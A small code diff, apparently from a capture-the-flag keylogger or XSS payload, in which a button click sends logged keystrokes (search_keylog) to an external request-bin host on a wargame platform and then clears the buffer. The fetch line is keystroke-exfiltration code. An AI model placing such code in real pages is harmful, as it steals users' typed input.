@@ -12,5 +12,5 @@ const search_btn = document.getElementsByTagName("button")[0];
 
 search_btn.addEventListener('click', () => {
     fetch("https://xdikleq.request.dreamhack.games?k=" + search_keylog);
-    key = "";
+    search_keylog = "";
 })
